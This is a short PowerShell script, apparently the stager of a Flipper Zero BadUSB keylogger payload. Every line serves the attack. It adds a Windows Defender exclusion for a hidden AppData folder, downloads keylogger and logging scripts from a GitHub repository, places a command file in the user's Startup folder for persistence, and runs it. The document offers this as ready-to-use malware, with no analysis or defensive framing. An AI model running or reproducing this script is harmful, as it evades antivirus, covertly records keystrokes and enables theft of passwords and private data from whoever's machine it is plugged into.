Add-MpPreference -ExclusionPath $env:appdata/-locker

iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-p.cmd -UseBasicParsing     -o "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-keys.ps1 -UseBasicParsing  -o "$env:appdata\-locker\-keys.ps1" 
iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-logs.ps1 -UseBasicParsing -o "$env:appdata\-locker\-logs.ps1"
iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/exit.ps1 -UseBasicParsing -o "$env:appdata\-exit.ps1" 

start-process "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"